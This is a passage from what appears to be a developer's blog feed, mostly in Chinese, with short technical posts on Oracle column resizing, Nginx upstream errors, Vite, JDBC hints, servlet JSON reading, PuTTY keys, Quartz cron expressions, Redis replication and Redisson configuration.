<p>這篇介紹如何解決ORA-01440: column to be modified must be empty to decrease precision or scale。</p>
<h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">問題:會發生在ALTER TABLE table_name MODIFY <span class="string">&quot;Salary&quot;</span> NUMBER(3);</span><br><span class="line">由NUMBER大改成小的時候出現ORA-01440: column to be modified must be empty to decrease precision or scale。</span><br></pre></td></tr></table></figure>

<h3 id="Step-by-Step"><a href="#Step-by-Step" class="headerlink" title="Step by Step"></a>Step by Step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">假設table name:Empolyee</span><br><span class="line">Step1:先備份Empolyee TABLE</span><br><span class="line">$ create table Empolyee_bak as select * from Empolyee;</span><br><span class="line"></span><br><span class="line">Step2:增加一個欄位Salary_tmp來備份Salary欄位</span><br><span class="line">$ ALTER TABLE Empolyee add Salary_tmp NUMBER(3);</span><br><span class="line"></span><br><span class="line">Step3:將Salary欄位資料複製至Salary_tmp</span><br><span class="line">$ update Empolyee <span class="built_in">set</span> Salary_tmp = Salary;</span><br><span class="line"></span><br><span class="line">Step4:將Salary欄位清空並修改欄位大小</span><br><span class="line">$ update Empolyee <span class="built_in">set</span> Salary = null;</span><br><span class="line">$ ALTER TABLE Empolyee modify Salary NUMBER(3);</span><br><span class="line"></span><br><span class="line">Step5:將Salary_tmp欄位資料複製回Salary</span><br><span class="line">$ update Empolyee <span class="built_in">set</span> Salary = Salary_tmp;</span><br><span class="line"></span><br><span class="line">Step6:刪除Salary_tmp欄位</span><br><span class="line">$ alter table Empolyee drop column Salary_tmp;</span><br><span class="line"></span><br><span class="line">備註Step4:將Salary欄位清空時，Salary必須要允許allow NULL</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx Error Code 99 Address not available</title>
    <url>/posts/b213a1ff/</url>
    <content><![CDATA[<h3 id="Intro-Nginx-Error-Code-99-Address-not-available"><a href="#Intro-Nginx-Error-Code-99-Address-not-available" class="headerlink" title="Intro Nginx Error Code 99 Address not available"></a>Intro Nginx Error Code 99 Address not available</h3><span id="more"></span>
<p>這篇介紹Nginx Error Code 99 Address not available。</p>
<h3 id="Nginx-error-log"><a href="#Nginx-error-log" class="headerlink" title="Nginx error log"></a>Nginx error log</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">error <span class="built_in">log</span>出現connect() to IP:PORT failed (99: Address not available) </span><br><span class="line"><span class="keyword">while</span> connecting to upstream</span><br><span class="line"></span><br><span class="line">檢查設定1:</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">   	proxy_http_version 1.1;</span><br><span class="line">   	proxy_set_header Connection <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">檢查設定2:</span><br><span class="line"></span><br><span class="line">upstream abc &#123;</span><br><span class="line">	server IP:PPORT;</span><br><span class="line">	keepalive 1000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Npm Run Dev Can Not Work For Vite</title>
    <url>/posts/616e0d78/</url>
    <content><![CDATA[<h3 id="Intro-Npm-Run-Dev-Can-Not-Work-For-Vite"><a href="#Intro-Npm-Run-Dev-Can-Not-Work-For-Vite" class="headerlink" title="Intro Npm Run Dev Can Not Work For Vite"></a>Intro Npm Run Dev Can Not Work For Vite</h3><span id="more"></span>
<p>這篇介紹Npm Run Dev Can Not Work For Vite.</p>
<h3 id="發生情境與解決方法"><a href="#發生情境與解決方法" class="headerlink" title="發生情境與解決方法"></a>發生情境與解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">當執行npm run dev出現</span><br><span class="line">&gt; vite --host</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;vite&#x27;</span> 不是內部或外部命令、可執行的程式或批次檔。</span><br><span class="line"></span><br><span class="line">解決方法:</span><br><span class="line">刪除專案下node_modules和package-lock.json資料夾</span><br><span class="line">$ npm i</span><br><span class="line">$ npm run dev</span><br><span class="line">即可解決</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
        <tag>Vite</tag>
      </tags>
  </entry>
  <entry>
    <title>OracleForDocker相關合法版本</title>
    <url>/posts/8283d937/</url>
    <content><![CDATA[<h3 id="OracleForDocker相關合法版本"><a href="#OracleForDocker相關合法版本" class="headerlink" title="OracleForDocker相關合法版本"></a>OracleForDocker相關合法版本</h3><span id="more"></span>
<p>這篇介紹Oracle相關合法的版本</p>
<h3 id="合法版本"><a href="#合法版本" class="headerlink" title="合法版本"></a>合法版本</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Oracle Database 19c (19.3.0) Enterprise Edition and Standard Edition 2</span><br><span class="line">Oracle Database 18c (18.4.0) Express Edition (XE)</span><br><span class="line">Oracle Database 18c (18.3.0) Enterprise Edition and Standard Edition 2</span><br><span class="line">Oracle Database 12c Release 2 (12.2.0.2) Enterprise Edition and Standard Edition 2</span><br><span class="line">Oracle Database 12c Release 1 (12.1.0.2) Enterprise Edition and Standard Edition 2</span><br><span class="line">Oracle Database 11g Release 2 (11.2.0.2) Express Edition (XE)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle因 Cursor 造成Hint失效</title>
    <url>/posts/98e97adc/</url>
    <content><![CDATA[<h3 id="Oracle因Cursor造成Hint失效"><a href="#Oracle因Cursor造成Hint失效" class="headerlink" title="Oracle因Cursor造成Hint失效"></a>Oracle因Cursor造成Hint失效</h3><span id="more"></span>

<h3 id="SQL語法"><a href="#SQL語法" class="headerlink" title="SQL語法"></a>SQL語法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">String sql = <span class="string">&quot;SELECT /*+ INDEX (ACCOUNTTRACKER ACCOUNTTRACKER_PK) */ userid &quot;</span></span><br><span class="line">+ <span class="string">&quot;FROM accounttracker WHERE userid=?&quot;</span>;</span><br><span class="line"></span><br><span class="line">ps = conn.prepareStatement(sql, ResultSet.TYPE_FORWARD_ONLY, ResultSet.CONCUR_UPDATABLE,</span><br><span class="line">ResultSet.CLOSE_CURSORS_AT_COMMIT);</span><br></pre></td></tr></table></figure>

<h3 id="執行的結果"><a href="#執行的結果" class="headerlink" title="執行的結果"></a>執行的結果</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">select rowid as <span class="string">&quot;Oracle_JDBC_interal_ROWID&quot;</span>, /*+ INDEX (ACCOUNTTRACKER ACCOUNTTRACKER_PK) */ userid</span><br><span class="line"> FROM accounttracker WHERE userid=:1</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用cursor的方式執行sql，jdbc 會自動塞入rowid 在select 後面，導致原本應該直接在select後面的hint失效。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Cursor</tag>
        <tag>Hint</tag>
      </tags>
  </entry>
  <entry>
    <title>POST:data-raw:Java端request接收方式</title>
    <url>/posts/da37adfd/</url>
    <content><![CDATA[<h3 id="POST-data-raw-Java端request接收方式"><a href="#POST-data-raw-Java端request接收方式" class="headerlink" title="POST:data-raw:Java端request接收方式"></a>POST:data-raw:Java端request接收方式</h3><span id="more"></span>
<p>HTTP有個方法是使用data-raw的方式將JSON字串POST<br>給Server。</p>
<h3 id="data-raw-request-example"><a href="#data-raw-request-example" class="headerlink" title="data-raw request example"></a>data-raw request example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://localhost/api/getExample&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Authorization: xxx&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data-raw <span class="string">&#x27;&#123;&quot;authToken&quot;: &quot;1a9240cedb9ecddfe3639aceabc6866cb84135c2446f2ed53d9cf992c5d1bd&quot;,&quot;timestamp&quot;:1590394416619&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Java-Servlet-request處理方式"><a href="#Java-Servlet-request處理方式" class="headerlink" title="Java Servlet request處理方式"></a>Java Servlet request處理方式</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">String requestJSON = getJSONParameters(request);</span><br><span class="line">private String getJSONParameters(HttpServletRequest request) throws IOException &#123;</span><br><span class="line">	String json = request.getReader().lines().reduce(<span class="string">&quot;&quot;</span>, (accumulator, actual) -&gt; accumulator + actual);</span><br><span class="line">	<span class="built_in">return</span> json;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>POST</tag>
        <tag>data-raw</tag>
      </tags>
  </entry>
  <entry>
    <title>Puttygen ppk from linux to windows</title>
    <url>/posts/773aa82d/</url>
    <content><![CDATA[<h2 id="Puttygen-ppk-from-linux-to-windows"><a href="#Puttygen-ppk-from-linux-to-windows" class="headerlink" title="Puttygen ppk from linux to windows"></a>Puttygen ppk from linux to windows</h2><span id="more"></span>
<p>這篇介紹透過PuTTY Key Generator將Linux上產生的private key generate 成 windows可用的.ppk格式。</p>
<h2 id="Puttygen-ppk-from-linux-to-windows-1"><a href="#Puttygen-ppk-from-linux-to-windows-1" class="headerlink" title="Puttygen ppk from linux to windows:"></a>Puttygen ppk from linux to windows:</h2><p>繼上一篇，在Linux上產生的private key。在windows上必須用PuTTYgen先Load Linux上的private key 在產生 .ppk格式。<br>用Putty ssh登入才能import .ppk。</p>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/puttygen.PNG" width="50%" />

<h2 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step:"></a>Step By Step:</h2><ol>
<li>Load id_rsa</li>
<li>Save private key -&gt; id_rsa.ppk</li>
<li>將Load id_rsa產生的key 加入 &#x2F;home&#x2F;{user}&#x2F;.ssh&#x2F;authorized_keys內</li>
<li>Putty -&gt; SSH -&gt; auth -&gt; browser -&gt; 選擇剛產生的 .ppk</li>
<li>即可免密碼登入Linux</li>
</ol>
]]></content>
      <categories>
        <category>Puttygen</category>
      </categories>
      <tags>
        <tag>PublicKey</tag>
      </tags>
  </entry>
  <entry>
    <title>QuartzCron表示式</title>
    <url>/posts/57c18b9b/</url>
    <content><![CDATA[<h3 id="QuartzCron表示式"><a href="#QuartzCron表示式" class="headerlink" title="QuartzCron表示式"></a>QuartzCron表示式</h3><span id="more"></span>
<p>以下列出QuartzCron表示式，可參考設定。</p>
<h3 id="Cron-表示式"><a href="#Cron-表示式" class="headerlink" title="Cron 表示式"></a>Cron 表示式</h3><p>包括以下 7 個欄位：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">格式: [秒] [分] [小時] [日] [月] [周] [年]</span><br><span class="line"></span><br><span class="line">序號     說明       是否必填      允許填寫的值       允許的萬用字元</span><br><span class="line"></span><br><span class="line"> 1           秒               是                  0-59                   , - * /</span><br><span class="line"></span><br><span class="line"> 2           分               是                  0-59                   , - * /</span><br><span class="line"></span><br><span class="line"> 3          小時            是                  0-23                    , - * /</span><br><span class="line"></span><br><span class="line"> 4          日               是                  1-31                     , - * ? / L W</span><br><span class="line"></span><br><span class="line"> 5          月               是           1-12 or JAN-DEC        , - * /</span><br><span class="line"></span><br><span class="line"> 6          周              是            1-7 or SUN-SAT          , - * ? / L <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"> 7          年               否         empty 或 1970-2099      , - * /</span><br></pre></td></tr></table></figure>

<h3 id="萬用字元說明："><a href="#萬用字元說明：" class="headerlink" title="萬用字元說明："></a>萬用字元說明：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. 反斜線（/）字元表示增量值。例如，在秒欄位中<span class="string">&quot;5/15&quot;</span>代表從第 5 秒開始，每 15 秒一次。</span><br><span class="line"></span><br><span class="line">2. 星號（*）字元是通配字元，表示該欄位可以接受任何可能的值（例如:在分的欄位上設定 <span class="string">&quot;*&quot;</span>,表示每一分鐘都會觸發）。</span><br><span class="line"></span><br><span class="line">3. 問號（?）問號表示這個欄位不包含具體值。所以，如果指定月內日期，可以在月內日期欄位中插入<span class="string">&quot;?&quot;</span>，表示周內日期值無關緊要。</span><br><span class="line">   字母 L 字元是 last 的縮寫。放在月內日期欄位中，表示安排在當月最後一天執行。在周內日期欄位中，如果<span class="string">&quot;L&quot;</span>單獨存在，就等於<span class="string">&quot;7&quot;</span>，</span><br><span class="line">   否則代表當月內周內日期的最後一個例項。所以<span class="string">&quot;0L&quot;</span>表示安排在當月的最後一個星期日執行。</span><br><span class="line"></span><br><span class="line">4. -  表示區間，例如 在小時上設定 <span class="string">&quot;10-12&quot;</span>,表示 10,11,12點都會觸發。</span><br><span class="line"></span><br><span class="line">5. 逗號（, ） 表示指定多個值，例如在周欄位上設定 <span class="string">&quot;MON,WED,FRI&quot;</span> 表示週一，週三和週五觸發</span><br><span class="line"></span><br><span class="line">6. 井號（<span class="comment">#）字元為給定月份指定具體的工作日例項。把&quot;MON#2&quot;放在周內日期欄位中，表示把任務安排在當月的第二個星期一。</span></span><br><span class="line"></span><br><span class="line">7. L 表示最後的意思。在日欄位設定上，表示當月的最後一天(依據當前月份，如果是二月還會依據是否是潤年[leap]), 在周欄位上表示星期六，</span><br><span class="line">   相當於<span class="string">&quot;7&quot;</span>或<span class="string">&quot;SAT&quot;</span>。如果在<span class="string">&quot;L&quot;</span>前加上數字，則表示該資料的最後一個。例如在周欄位上設定<span class="string">&quot;6L&quot;</span>這樣的格式,則表示<span class="string">&quot;本月最後一個星期五&quot;</span>。</span><br><span class="line"></span><br><span class="line">8. W 表示離指定日期的最近那個工作日(週一至週五). 例如在日欄位上設定<span class="string">&quot;15W&quot;</span>，表示離每月15號最近的那個工作日觸發。如果15號正好是週六，</span><br><span class="line">   則找最近的週五(14號)觸發, 如果15號是周未，則找最近的下週一(16號)觸發.如果15號正好在工作日(週一至週五)，則就在該天觸發。</span><br><span class="line">   如果指定格式為 <span class="string">&quot;1W&quot;</span>,它則表示每月1號往後最近的工作日觸發。如果1號正是週六，則將在3號下週一觸發。(注，<span class="string">&quot;W&quot;</span>前只能設定具體的數字,不允許區間<span class="string">&quot;-&quot;</span>)。</span><br><span class="line"></span><br><span class="line">注：<span class="string">&quot;L&quot;</span>和 <span class="string">&quot;W&quot;</span>可以一組合使用。如果在日欄位上設定<span class="string">&quot;LW&quot;</span>，則表示在本月的最後一個工作日觸發。</span><br></pre></td></tr></table></figure>

<h3 id="常用example"><a href="#常用example" class="headerlink" title="常用example"></a>常用example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0 0 12 * * ?     每天12點觸發</span><br><span class="line"></span><br><span class="line">0 15 10 ? * *     每天10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 * * ?     每天10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 * * ? *     每天10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 * * ? 2005     2005年每天10點15分觸發</span><br><span class="line"></span><br><span class="line">0 * 14 * * ?     每天下午的 2點到2點59分每分觸發</span><br><span class="line"></span><br><span class="line">0 0/5 14 * * ?     每天下午的 2點到2點59分(整點開始，每隔5分觸發)</span><br><span class="line"></span><br><span class="line">0 0/5 14,18 * * ?     每天下午的 2點到2點59分(整點開始，每隔5分觸發) 每天下午的 18點到18點59分(整點開始，每隔5分觸發)</span><br><span class="line"></span><br><span class="line">0 0-5 14 * * ?     每天下午的 2點到2點05分每分觸發</span><br><span class="line"></span><br><span class="line">0 10,44 14 ? 3 WED     3月分每週三下午的 2點10分和2點44分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 ? * MON-FRI     從週一到週五每天上午的10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 15 * ?     每月15號上午10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 L * ?     每月最後一天的10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 ? * 6L     每月最後一週的星期五的10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 ? * 6L 2002-2005     從2002年到2005年每月最後一週的星期五的10點15分觸發</span><br><span class="line"></span><br><span class="line">0 15 10 ? * 6<span class="comment">#3     每月的第三週的星期五開始觸發</span></span><br><span class="line"></span><br><span class="line">0 0 12 1/5 * ?     每月的第一個中午開始每隔5天觸發一次</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>quartz</tag>
        <tag>Cron</tag>
      </tags>
  </entry>
  <entry>
    <title>RedisReplication</title>
    <url>/posts/22ebd526/</url>
    <content><![CDATA[<h3 id="RedisReplication"><a href="#RedisReplication" class="headerlink" title="RedisReplication"></a>RedisReplication</h3><span id="more"></span>
<p>按照Redis官方文件(<span class="exturl" data-url="aHR0cHM6Ly9yZWRpcy5pby90b3BpY3MvcmVwbGljYXRpb24pJUU0JUJCJThCJUU3JUI0JUI5JUVGJUJDJThDUmVkaXM=">https://redis.io/topics/replication)介紹，Redis<i class="fa fa-external-link-alt"></i></span> Replication是一種Master-Slave模式<br>的Copy機制，這個機制讓Slave node可以變成和Master node完全相同的複本。</p>
<h3 id="What’s-Redis-Replication-Solution"><a href="#What’s-Redis-Replication-Solution" class="headerlink" title="What’s Redis Replication Solution?"></a>What’s Redis Replication Solution?</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Replication can be used both <span class="keyword">for</span> scalability, <span class="keyword">in</span> order to have multiple slaves <span class="keyword">for</span> read-only queries</span><br><span class="line">(<span class="keyword">for</span> example, slow O(N) operations can be offloaded to slaves), or simply <span class="keyword">for</span> improving data safety and high availability.</span><br></pre></td></tr></table></figure>

<h3 id="multiple-slaves-for-read-only-queries"><a href="#multiple-slaves-for-read-only-queries" class="headerlink" title="multiple slaves for read-only queries"></a>multiple slaves for read-only queries</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Master專門用來write，多個Slave用於分攤Read的壓力。</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/MultipleSlavesForRead-OnlyQueries.png" width="50%" />


<h3 id="High-Availability"><a href="#High-Availability" class="headerlink" title="High Availability"></a>High Availability</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">若Master掛了，可以promote其中一個Slave成為新的Master，進而實現故障轉移(failover)。</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Redis_High_Availability.png" width="50%" />]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>RedisReplication</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisson Replcated Mode</title>
    <url>/posts/bc768cff/</url>
    <content><![CDATA[<h3 id="Redisson-Replcated-Mode"><a href="#Redisson-Replcated-Mode" class="headerlink" title="Redisson Replcated Mode"></a>Redisson Replcated Mode</h3><span id="more"></span>
<p>Replicated mode could be used with any hosting.<br>Replicated connection mode activated by follow line:</p>
<p>ReplicatedServersConfig replicatedConfig &#x3D; config.useReplicatedServers();</p>
<p>Replicated ServersConfig settings listed below:</p>
<h3 id="Replicated-Programmatic-config"><a href="#Replicated-Programmatic-config" class="headerlink" title="Replicated Programmatic config"></a>Replicated Programmatic config</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Config config = new Config();</span><br><span class="line">config.useReplicatedServers()</span><br><span class="line">    .setScanInterval(2000) // master node change scan interval</span><br><span class="line">    // use <span class="string">&quot;rediss://&quot;</span> <span class="keyword">for</span> SSL connection</span><br><span class="line">    .addNodeAddress(<span class="string">&quot;redis://127.0.0.1:7000&quot;</span>, <span class="string">&quot;redis://127.0.0.1:7001&quot;</span>)</span><br><span class="line">    .addNodeAddress(<span class="string">&quot;redis://127.0.0.1:7002&quot;</span>);</span><br><span class="line"></span><br><span class="line">RedissonClient redisson = Redisson.create(config);</span><br></pre></td></tr></table></figure>

<h3 id="Replicated-settings"><a href="#Replicated-settings" class="headerlink" title="Replicated settings"></a>Replicated settings</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nodeAddresses</span><br><span class="line">Add Redis node address <span class="keyword">in</span> host:port format. Multiple nodes could be added at once. All nodes (master and slaves) should be defined. Use rediss:// protocol <span class="keyword">for</span> SSL connection.</span><br><span class="line"></span><br><span class="line">scanInterval</span><br><span class="line">Default value: 1000</span><br><span class="line"></span><br><span class="line">Replicated node scan interval <span class="keyword">in</span> milliseconds.</span><br><span class="line"></span><br><span class="line">loadBalancer</span><br><span class="line">Default value: org.redisson.connection.balancer.RoundRobinLoadBalancer</span><br><span class="line"></span><br><span class="line">Сonnection load balancer <span class="keyword">for</span> multiple Redis servers. Available implementations:</span><br><span class="line">org.redisson.connection.balancer.WeightedRoundRobinBalancer</span><br><span class="line">org.redisson.connection.balancer.RoundRobinLoadBalancer</span><br><span class="line">org.redisson.connection.balancer.RandomLoadBalancer</span><br><span class="line"></span><br><span class="line">dnsMonitoringInterval</span><br><span class="line">Default value: 5000</span><br><span class="line"></span><br><span class="line">Interval <span class="keyword">in</span> milliseconds to check the endpoint<span class="string">&#x27;s DNS. Applications must ensure the JVM DNS cache TTL is low enough to support this. Set -1 to disable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">subscriptionConnectionMinimumIdleSize</span></span><br><span class="line"><span class="string">Default value: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis &#x27;</span>slave<span class="string">&#x27; node minimum idle subscription (pub/sub) connection amount for each slave node</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">subscriptionConnectionPoolSize</span></span><br><span class="line"><span class="string">Default value: 50</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis &#x27;</span>slave<span class="string">&#x27; node maximum subscription (pub/sub) connection pool size for each slave node</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">slaveConnectionMinimumIdleSize</span></span><br><span class="line"><span class="string">Default value: 24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis &#x27;</span>slave<span class="string">&#x27; node minimum idle connection amount for each slave node</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">slaveConnectionPoolSize</span></span><br><span class="line"><span class="string">Default value: 64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis &#x27;</span>slave<span class="string">&#x27; node maximum connection pool size for each slave node</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">masterConnectionMinimumIdleSize</span></span><br><span class="line"><span class="string">Default value: 24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis &#x27;</span>master<span class="string">&#x27; node minimum idle connection amount for each slave node. Redisson idle connections are remain for elected slave as master. </span></span><br><span class="line"><span class="string">Because this node remains in slave connection pool but in non-active state. </span></span><br><span class="line"><span class="string">These connections are preserved for case when your cluster lost all slaves. In this case master used as slave and idle-connections become in use.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">masterConnectionPoolSize</span></span><br><span class="line"><span class="string">Default value: 64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis &#x27;</span>master<span class="string">&#x27; node maximum connection pool size</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">idleConnectionTimeout</span></span><br><span class="line"><span class="string">Default value: 10000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If pooled connection not used for a timeout time and current connections amount bigger than minimum idle connections pool size, </span></span><br><span class="line"><span class="string">then it will closed and removed from pool. Value in milliseconds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">readMode</span></span><br><span class="line"><span class="string">Default value: SLAVE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Set node type used for read operation. Available values:</span></span><br><span class="line"><span class="string">SLAVE - Read from slave nodes, uses MASTER if no SLAVES are available.</span></span><br><span class="line"><span class="string">MASTER - Read from master node,</span></span><br><span class="line"><span class="string">MASTER_SLAVE - Read from master and slave nodes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">subscriptionMode</span></span><br><span class="line"><span class="string">Default value: MASTER</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Set node type used for subscription operation. Available values:</span></span><br><span class="line"><span class="string">SLAVE - Subscribe to slave nodes,</span></span><br><span class="line"><span class="string">MASTER - Subscribe to master node,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">connectTimeout</span></span><br><span class="line"><span class="string">Default value: 10000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Timeout during connecting to any Redis server.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">timeout</span></span><br><span class="line"><span class="string">Default value: 3000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Redis server response timeout. Starts to countdown when Redis command was succesfully sent. Value in milliseconds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">retryAttempts</span></span><br><span class="line"><span class="string">Default value: 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Error will be thrown if Redis command can&#x27;</span>t be sended to Redis server after retryAttempts. But <span class="keyword">if</span> it sent succesfully <span class="keyword">then</span> <span class="built_in">timeout</span> will be started.</span><br><span class="line"></span><br><span class="line">retryInterval</span><br><span class="line">Default value: 1500</span><br><span class="line"></span><br><span class="line">Time interval after <span class="built_in">which</span> another one attempt to send Redis <span class="built_in">command</span> will be executed. Value <span class="keyword">in</span> milliseconds.</span><br><span class="line"></span><br><span class="line">failedSlaveReconnectionInterval</span><br><span class="line">Default value: 3000</span><br><span class="line"></span><br><span class="line">Interval of Redis Slave reconnection attempt when it was excluded from internal list of available servers. </span><br><span class="line">On each <span class="built_in">timeout</span> event Redisson tries to connect to disconnected Redis server. Value <span class="keyword">in</span> milliseconds.</span><br><span class="line"></span><br><span class="line">failedSlaveCheckInterval</span><br><span class="line">Default value: 60000</span><br><span class="line"></span><br><span class="line">Redis Slave node failing to execute commands is excluded from the internal list of available nodes when the time interval </span><br><span class="line">from the moment of first Redis <span class="built_in">command</span> execution failure on this server reaches defined value. Value <span class="keyword">in</span> milliseconds.</span><br><span class="line"></span><br><span class="line">database</span><br><span class="line">Default value: 0</span><br><span class="line"></span><br><span class="line">Database index used <span class="keyword">for</span> Redis connection</span><br><span class="line"></span><br><span class="line">password</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Password <span class="keyword">for</span> Redis server authentication.</span><br><span class="line"></span><br><span class="line">subscriptionsPerConnection</span><br><span class="line">Default value: 5</span><br><span class="line"></span><br><span class="line">Subscriptions per Redis connection <span class="built_in">limit</span></span><br><span class="line"></span><br><span class="line">clientName</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Name of client connection</span><br><span class="line"></span><br><span class="line">sslEnableEndpointIdentification</span><br><span class="line">Default value: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Enables SSL endpoint identification.</span><br><span class="line"></span><br><span class="line">sslProvider</span><br><span class="line">Default value: JDK</span><br><span class="line"></span><br><span class="line">Defines SSL provider (JDK or OPENSSL) used to handle SSL connections.</span><br><span class="line"></span><br><span class="line">sslTruststore</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines path to SSL truststore</span><br><span class="line"></span><br><span class="line">sslTruststorePassword</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines password <span class="keyword">for</span> SSL truststore</span><br><span class="line"></span><br><span class="line">sslKeystore</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines path to SSL keystore</span><br><span class="line"></span><br><span class="line">sslKeystorePassword</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines password <span class="keyword">for</span> SSL keystore</span><br><span class="line"></span><br><span class="line">pingConnectionInterval</span><br><span class="line">Default value: 0</span><br><span class="line"></span><br><span class="line">Defines PING <span class="built_in">command</span> sending interval per connection to Redis. Set 0 to <span class="built_in">disable</span>.</span><br><span class="line"></span><br><span class="line">keepAlive</span><br><span class="line">Default value: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Enables TCP keepAlive <span class="keyword">for</span> connection.</span><br><span class="line"></span><br><span class="line">tcpNoDelay</span><br><span class="line">Default value: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Enables TCP noDelay <span class="keyword">for</span> connection.</span><br></pre></td></tr></table></figure>

